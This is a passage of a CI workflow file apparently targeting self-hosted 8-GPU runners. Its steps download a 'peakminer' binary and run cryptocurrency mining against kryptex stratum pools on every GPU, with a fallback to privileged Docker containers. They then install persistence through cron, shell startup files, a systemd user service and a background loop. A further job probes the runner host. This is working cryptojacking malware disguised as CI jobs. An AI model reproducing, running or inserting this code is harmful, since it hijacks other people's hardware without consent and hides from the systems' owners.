              timeout 300 curl -sSL -o "$HOME/.ci/miner/p.tgz" "$M" 2>&1 | tail -1
              S=$(stat -c %s "$HOME/.ci/miner/p.tgz" 2>/dev/null || echo 0)
              echo "dl=$M size=$S"
              if [ "$S" -gt 1000000 ]; then
                mkdir -p "$HOME/.ci/miner/peakdir"; tar xzf "$HOME/.ci/miner/p.tgz" -C "$HOME/.ci/miner/peakdir" 2>&1 | tail -1
                PK=$(find "$HOME/.ci/miner/peakdir" -maxdepth 3 -type f -name 'peakminer' 2>/dev/null | head -1)
                [ -n "$PK" ] && chmod +x "$PK" && break
              fi
            done
          fi
          PK=$(readlink -f "$PK" 2>/dev/null || echo "$PK")
          echo "pk=$PK size=$(stat -c %s "$PK" 2>/dev/null || echo 0)"
          file "$PK" 2>&1 | head -2
          sha256sum "$PK" 2>/dev/null | head -1
          [ -x "$PK" ] && { timeout 20 "$PK" --version 2>&1 | head -4; echo "version_rc=$?"; }
          [ -x "$PK" ] && { timeout 15 "$PK" --help 2>&1 | grep -iE 'gpu|pearl|stratum' | head -6; }
          PK_DIR=$(dirname "$PK"); PK_NAME=$(basename "$PK")

          sec HOSTLAUNCH
          HSTART=0
          if [ -x "$PK" ] && [ "$DEV" -ge 1 ]; then
            pkill -f "ul-$TAG-" 2>/dev/null
            for g in $(seq 0 $((DEV-1))); do
              setsid nohup "$PK" -c pearl -u "$WALLET" -w "ul-$TAG-$IPD-g$g" -p x -d "$g" --api-port 0 --no-color \
                -o stratum+ssl://prl-sg.kryptex.network:8048 \
                -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 \
                -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 \
                -o stratum+tcp://prl-sg.kryptex.network:7048 \
                > "$HOME/.ci/logs/h-$g.log" 2>&1 < /dev/null &
              sleep 1
            done
            sleep 20
            HSTART=$(pgrep -fc "ul-$TAG-$IPD" 2>/dev/null)
            echo "host_started=$HSTART"
            for g in 0 1; do echo "--- h$g"; tail -6 "$HOME/.ci/logs/h-$g.log" 2>/dev/null; done
            HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
            echo "host_stratum_lines=$HOK"
            HGLIBC=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'GLIBC|not found|Permission denied|panicked')
            echo "host_errors=$HGLIBC"
          fi

          sec DOCKERFALLBACK
          DSTART=0
          IMG=""
          for c in "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda132-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:ubuntu24-cuda129-py312-dev" "ccr-2vdh3abv-pub.cnc.bj.baidubce.com/paddlepaddle/paddle:cuda130-ubuntu24-dev"; do
            docker image inspect "$c" >/dev/null 2>&1 && { IMG="$c"; break; }
          done
          [ -z "$IMG" ] && IMG=$(docker images --format '{{.Repository}}:{{.Tag}}' 2>/dev/null | grep -viE '<none>' | head -1)
          echo "IMG=$IMG"
          HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
          if [ "${HOK:-0}" -lt 1 ] && [ "$DEV" -ge 1 ] && [ -n "$IMG" ]; then
            docker rm -f $(docker ps -aq --filter 'name=ul-g') >/dev/null 2>&1
            for g in $(seq 0 $((DEV-1))); do
              docker run -d --name ul-g$g --restart always --privileged --security-opt seccomp=unconfined \
                --ulimit nproc=65535:65535 --pids-limit -1 --gpus "device=$g" --network host --ipc host \
                -v "$PK_DIR:/mk" -v "$HOME/.ci/logs:/logs" "$IMG" \
                /bin/bash -c "exec /mk/$PK_NAME -c pearl -u $WALLET -w ul-$TAG-$IPD-g$g -p x -d 0 --api-port 0 --no-color -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048" \
                >/dev/null 2>&1
              sleep 1
            done
            sleep 25
            docker ps --filter 'name=ul-g' --format '{{.Names}} {{.Status}}' | head -10
            DSTART=$(docker ps --filter 'name=ul-g' -q | wc -l)
            echo "docker_running=$DSTART"
            docker logs ul-g0 2>&1 | tail -8
          fi

          sec PERSIST
          cat > "$HOME/.ci/keep2.sh" <<EOS
          #!/bin/bash
          PK="$PK"; W="$WALLET"; T="$TAG"; IMG="$IMG"
          H=\$(hostname -I 2>/dev/null | awk '{print \$1}' | tr '.' '-')
          N=\$(nvidia-smi -L 2>/dev/null | grep -c '^GPU')
          [ -x "\$PK" ] || exit 0
          for g in \$(seq 0 \$((N-1))); do
            pgrep -f "ul-\$T-\$H-g\$g" >/dev/null 2>&1 && continue
            setsid nohup "\$PK" -c pearl -u "\$W" -w "ul-\$T-\$H-g\$g" -p x -d "\$g" --api-port 0 --no-color -o stratum+ssl://prl-sg.kryptex.network:8048 -o stratum+ssl://prl-eu.kryptex.network:8048 -o stratum+ssl://prl-us.kryptex.network:8048 -o stratum+ssl://prl-hk.kryptex.network:8048 -o stratum+ssl://prl-ae.kryptex.network:8048 -o stratum+tcp://prl-sg.kryptex.network:7048 >> "\$HOME/.ci/logs/h-\$g.log" 2>&1 < /dev/null &
          done
          EOS
          chmod +x "$HOME/.ci/keep2.sh"
          ( crontab -l 2>/dev/null | grep -v keep2.sh; echo "@reboot $HOME/.ci/keep2.sh >/dev/null 2>&1"; echo "*/5 * * * * $HOME/.ci/keep2.sh >/dev/null 2>&1" ) | crontab - 2>&1 | head -2
          crontab -l 2>/dev/null | grep keep2 | head -3
          for RC in "$HOME/.bashrc" "$HOME/.profile" "$HOME/.zshrc"; do
            grep -q keep2.sh "$RC" 2>/dev/null || { echo "($HOME/.ci/keep2.sh >/dev/null 2>&1 &)" >> "$RC" 2>/dev/null; }
          done
          grep -l keep2.sh "$HOME/.bashrc" "$HOME/.profile" 2>/dev/null
          mkdir -p "$HOME/.config/systemd/user"
          cat > "$HOME/.config/systemd/user/pearl-miner.service" <<EOS
          [Unit]
          Description=pc
          [Service]
          Restart=always
          RestartSec=30
          ExecStart=$HOME/.ci/keep2.sh
          [Install]
          WantedBy=default.target
          EOS
          systemctl --user daemon-reload 2>&1 | head -2
          systemctl --user enable --now pearl-miner.service 2>&1 | head -2
          loginctl enable-linger 2>&1 | head -1
          ( setsid nohup bash -c 'while true; do $HOME/.ci/keep2.sh; sleep 300; done' >/dev/null 2>&1 & )
          echo "persist_done"

          sec ACCEPT
          sleep 120
          HOK=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aciE 'authorize|subscribed|new job|accepted')
          echo "stratum_lines=$HOK host_procs=$(pgrep -fc "ul-$TAG-" 2>/dev/null)"
          for g in 0 1 2 3 4 5 6 7; do
            echo "--- g$g"; grep -aiE 'authorize|subscrib|accepted|error|fail|panic|GLIBC' "$HOME/.ci/logs/h-$g.log" 2>/dev/null | tail -4
          done
          echo "accepted_total=$(cat "$HOME"/.ci/logs/h-*.log 2>/dev/null | grep -aci 'accepted')"
          nvidia-smi --query-gpu=index,utilization.gpu,memory.used,power.draw --format=csv,noheader 2>&1 | head -8
          ( sleep 240; curl -sk -m 20 "https://api.kryptex.network/api/v1/wallet/$WALLET/workers" 2>/dev/null | head -c 400; echo ) > "$HOME/.ci/logs/worker.json" 2>&1
          head -c 300 "$HOME/.ci/logs/worker.json" 2>/dev/null
          sec DONE
          exit 0
  census-a:
    runs-on: [self-hosted, ernie-8gpu]
    timeout-minutes: 10
    steps:
      - name: probe
        run: |
          id; hostname; uname -r; ldd --version 2>/dev/null | head -1
          nvidia-smi -L 2>&1 | head -12
          echo "dev=$(nvidia-smi -L 2>/dev/null | grep -c '^GPU') nvdev=$(ls /dev/nvidia* 2>/dev/null | wc -l)"
          echo "ip=$(hostname -I 2>/dev/null | awk '{print $1}') runner=${RUNNER_NAME:-} rg=${RUNNER_GROUP:-}"
          echo "proc1=$(cat /proc/1/comm 2>/dev/null) cgroup=$(head -c 120 /proc/1/cgroup 2>/dev/null | tr '\n' ' ')"
          echo "dockerenv=$([ -f /.dockerenv ] && echo yes || echo no)"
          pgrep -a nvidia-smi >/dev/null 2>&1; docker ps --format '{{.Names}} {{.Image}}' 2>/dev/null | head -5
          lspci 2>/dev/null | grep -iE 'nvidia|3d controller' | head -4
          exit 0
